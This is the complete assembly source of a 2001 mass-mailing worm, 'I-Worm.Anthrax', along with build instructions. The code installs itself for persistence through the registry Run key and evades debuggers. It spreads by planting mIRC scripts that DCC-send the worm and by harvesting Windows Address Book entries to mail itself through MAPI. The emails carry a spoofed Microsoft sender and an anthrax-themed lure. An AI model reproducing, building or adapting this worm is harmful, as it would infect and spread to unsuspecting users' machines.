; comment #
; Name : I-Worm.Anthrax (aka : I-Worm.Fi)
; Author : PetiK
; Date : October 11th - November 6th
; Size : 6144 byte (compiled with UPX tool)
; 
; Action:   Copy itself to
;       * WINDOWS\SYSTEM\MsSys32.exe
;   Add in the key HKLM\Software\Microsoft\Windows\CurrentVersion\Run the value
;       * Microsoft System = WINDOWS\SYSTEM\MsSys32.exe
; 
;   The virus uses anti-* against SoftICE
;   
;   It creates a file to go to a web site about the anthrax.
;   On the Desktop if it can or else on c:\ root.
; 
;   It creates in some directory a script to be able to spread with mIRC :
; 
;       -C:\mirc
;       -C:\mirc32
;       -C:\progra~1
;       -C:\progra~1
; 
;   To spread, it uses MAPI mechanism with 10 first email found in the WAB.
; 
; 
; To delete the worm :
; Look at the file Delete_Fi.vbs
; 
; To built the worm :
; @echo off
; tasm32 /ml /m9 Anthrax
; tlink32 -Tpe -c -x -aa Anthrax,,,import32,dllz
; upx -9 Anthrax.exe
; if exist *.obj del *.obj
; if exist *.map del *.map
; 
; 
; Notes of the authors:
; The worm bugs at the end of it spread WAB.
; I want to thanks very much Benny. I learnt a lot of things while seeing his differents
; code (XTC, HiV and Universe).
; 
; #

.586p
.model flat
.code

JUMPS

api macro a
extrn a:proc
call a
endm

include useful.inc
include myinclude.inc

start:

twin_worm:
    push    50
    mov esi,offset orig_worm
    push    esi
    push    0
    api GetModuleFileNameA              ; esi = name of file

    mov edi,offset copy_worm
    push    edi
    push    50
    push    edi
    api GetSystemDirectoryA
    add edi,eax
    mov eax,"SsM\"
    stosd
    mov eax,"23sy"
    stosd
    mov eax,"exe."
    stosd
    pop edi                     ; edi = %system%\MsSys32.exe

    push    1
    push    edi
    push    esi
    api CopyFileA                   ; copy itself
    test    eax,eax
    je  end_twin                    ; already copy ??

    push    20
    push    edi
    push    1
    @pushsz "Microsoft System"
    @pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
    push    80000002h
    api SHSetValueA                 ; regedit


mess:   push    1040h
    @pushsz "Microsoft Windows"
    call    @txt
    db  "You must be connected to run this file.",CRLF,CRLF
    db  "If it's not the case, please connect you.",0
    @txt:
    push    0
    api MessageBoxA                 ; fake message
end_twin:

    call    debug
e_sr:
    call    hide_worm

    call    create_url
    call    spread_mirc

verif_inet:
    push    0
    push    offset inet
    api InternetGetConnectedState
    dec eax
    jnz verif_inet

    spread_wab:
    pushad
    srch_wab:
    mov edi,offset wab_path
    push    offset wab_size
    push    edi
    push    offset reg
    push    0
    @pushsz "Software\Microsoft\Wab\WAB4\Wab File Name" ; The name of WAB file
    push    80000001h
    api SHGetValueA

    push    0
    push    0
    push    3
    push    0
    push    1
    push    80000000h
    push    offset wab_path
    api CreateFileA
    inc eax
    je  end_srch_wab
    dec eax
    xchg    ebx,eax

    push    0
    push    0
    push    0
    push    2
    push    0
    push    ebx
    api CreateFileMappingA
    test    eax,eax
    je  end_wab1
    xchg    eax,ebp

    push    0
    push    0
    push    0
    push    4
    push    ebp
    api MapViewOfFile
    test    eax,eax
    je  end_wab2
    xchg    eax,esi

    mov verif,0
    d_scan_mail:
    call    @smtp
    db  'SMTP',00h,1Eh,10h,56h,3Ah          ; the string what we want to find
    @smtp:
    pop edi
    s_scan_mail:
    pushad
    push    9
    pop ecx
    rep cmpsb
    popad
    je  scan_mail
    inc esi
    loop    s_scan_mail
    
    end_wab3:
    push    esi
    api UnmapViewOfFile
    end_wab2:
    push    ebp
    api CloseHandle
    end_wab1:
    push    ebx
    api CloseHandle
    end_srch_wab:
    popad

end_worm:
    push    0
    api ExitProcess

create_url:                     ; This routine has perhaps bug on WinNT/2k
    pushad
    desktop_url:
    @pushsz "SHELL32.dll"
    api LoadLibraryA
    mov ebx,eax
    @pushsz "SHGetSpecialFolderPathA"
    push    ebx
    api GetProcAddress
    test    eax,eax
    jz  on_hd
    mov ebp,eax
    push    0
    push    0                   ; DESKTOP
    push    offset desktop
    push    0
    call    ebp
    @pushsz "\Anthrax_Info.url"
    push    offset desktop
    api lstrcat
    mov esi,offset desktop
    jmp c_sys
    on_hd:
    @getsz  "C:\Anthrax_Info.url",esi
    c_sys:
    push    50
    push    offset shelldir
    api GetSystemDirectoryA
    @pushsz "\Shell32.dll"  
    push    offset shelldir
    api lstrcat
    cr_url:
    push    esi
    @pushsz "http://www.anthrax.com"
    @pushsz "URL"
    @pushsz "InternetShortcut"
    api WritePrivateProfileStringA
    push    esi
    @pushsz "23"
    @pushsz "IconIndex"
    @pushsz "InternetShortcut"
    api WritePrivateProfileStringA
    push    esi
    push    offset shelldir
    @pushsz "IconFile"
    @pushsz "InternetShortcut"
    api WritePrivateProfileStringA  
    end_url:
    push    ebx
    api FreeLibrary
    popad
    ret

debug   Proc
    pushad
    mov eax,fs:[20h]
    test    eax,eax
    je  $+4
    kill:   int 19h             ; CD19
    api IsDebuggerPresent
    test    eax,eax
    jne kill

    push    0
    push    80h
    push    3
    push    0
    push    0
    push    40000000h or 80000000h
    @pushsz "\\.\SICE"              ; SOFTICE driver win98
    api CreateFileA
    inc eax
    jne kill

    push    0
    push    80h
    push    3
    push    0
    push    0
    push    40000000h or 80000000h
    @pushsz "\\.\NTICE"             ; SOFTICE driver winNT/2k
    api CreateFileA
    inc eax
    jne kill

    popad
    ret
debug   EndP

hide_worm   Proc
    pushad
    @pushsz "KERNEL32.dll"
    api GetModuleHandleA
    xchg    eax,ecx
    jecxz   end_hide_worm
    @pushsz "RegisterServiceProcess"        ; Registered as Service Process
    push    ecx
    api GetProcAddress
    xchg    eax,ecx
    jecxz   end_hide_worm
    push    1
    push    0
    call    ecx
    end_hide_worm:
    popad
    ret
hide_worm   EndP


spread_mirc Proc
    push    50
    push    offset mircspread
    api GetSystemDirectoryA
    @pushsz "\MsSys32.exe"
    push    offset mircspread
    api lstrcat
    pushad  
    call    @mirc
    db  'C:\mirc\script.ini',0
    db  'C:\mirc32\script.ini',0        ; spread with mIRC. Thanx to Microsoft.
    db  'C:\progra~1\mirc\script.ini',0
    db  'C:\progra~1\mirc32\script.ini',0
    @mirc:
    pop esi
    push    4
    pop ecx
    mirc_loop:
    push    ecx
    push    0
    push    80h
    push    2
    push    0
    push    1
    push    40000000h
    push    esi
    api CreateFileA
    mov [hmirc],eax
    push    0
    push    offset byte_write
    @tmp_mirc:
    push    e_mirc - s_mirc
    push    offset s_mirc
    push    [hmirc]
    api WriteFile
    push    [hmirc]
    api CloseHandle
    @endsz
    pop ecx
    loop    mirc_loop
    end_spread_mirc:
    popad   
    ret
spread_mirc EndP


scan_mail:
    xor edx,edx
    add esi,21
    mov edi,offset mail_addr
    push    edi
    p_c:    lodsb
    cmp al," "
    je  car_s
    cmp al,00h
    je  f_mail
    cmp al,"@"
    jne not_a
    inc edx
    not_a:  stosb
        jmp p_c
    car_s:  inc esi
        jmp p_c
    f_mail: xor al,al
        stosb
        pop edi
        test edx,edx
        je  d_scan_mail
        call    send_mail
        cmp verif,10
        je  end_worm
        jmp d_scan_mail


send_mail:
    inc verif
    pushad
    @pushsz "MAPI32.DLL"
    api LoadLibraryA
    xchg    ebx,eax
mapi    macro   x
    push    offset sz&x
    push    ebx
    api GetProcAddress
    mov x,eax
    endm
    mapi    MAPILogon
    mapi    MAPISendMail
    mapi    MAPILogoff
    
    mapi_logon:
    xor eax,eax
    push    offset hMAPI
    push    eax
    push    eax
    push    eax
    push    eax
    push    eax
    call    MAPILogon
    test    eax,eax
    jne end_send_mail
    mapi_send_mail:
    xor eax,eax
    push    eax
    push    eax
    push    offset MsgWrm
    push    eax
    push    [hMAPI]
    call    MAPISendMail
    mapi_logoff:
    xor eax,eax
    push    eax
    push    eax
    push    eax
    push    [hMAPI]
    call    MAPILogoff
    push    ebx
    api FreeLibrary
    end_send_mail:
    popad
    ret


.data
; === copy_worm ===
orig_worm   db 50 dup (0)
copy_worm   db 50 dup (0)


; === url_info ===
desktop     db 50 dup (0)
shelldir    db 50 dup (0)
hurl        dd ?


; === spread_mirc ===
byte_write  dd ?
hmirc       dd ?

s_mirc: db '[script]',CRLF
    db 'n0=on 1:JOIN:{',CRLF
    db 'n1= /if ( $nick == $me ) { halt }',CRLF
    db 'n2= /.dcc send $nick '
mircspread  db 50 dup (0)
    db CRLF,'n3=}',0
e_mirc:


; === spread_wab ===
inet        dd 0
wab_path    db 100 dup (0)
wab_size    dd 100
reg     dd 1
verif       dd ?


; === scan_mail ===
mail_addr   db 128 dup (?)

; === spread_mail ===
szMAPISendMail  db "MAPISendMail",0
szMAPILogon db "MAPILogon",0
szMAPILogoff    db "MAPILogoff",0

MAPISendMail    dd ?
MAPILogon   dd ?
MAPILogoff  dd ?
hMAPI       dd 0


; === gen_mail ===
subjectwrm  db "What is the anthrax ?",0
bodywrm     db "I send you some informations about Anthrax.",CRLF
        db "Click on the attached file.",0
name_mail   db "Anthrax_Info.exe",0
mail_from   db "support@microsoft.com",0

MsgWrm      dd ?
        dd offset subjectwrm
        dd offset bodywrm
        dd ?
        dd ?
        dd ?
        dd 2
        dd offset MsgFrom
        dd 1
        dd offset MsgToWrm
        dd 1
        dd offset AttachWrm

MsgFrom     dd ?
        dd 1
        dd offset MsgFrom
        dd offset mail_from
        dd ?
        dd ?


MsgToWrm    dd ?
        dd 1
        dd ?
        dd offset mail_addr
        dd ?
        dd ?

AttachWrm   dd ?
        dd ?
        dd ?
        dd offset orig_worm
        dd offset name_mail
        dd ?


signature   db "I-Worm.Anthrax "
author      db "Coded by PetiK - 2001",00h

end start
end
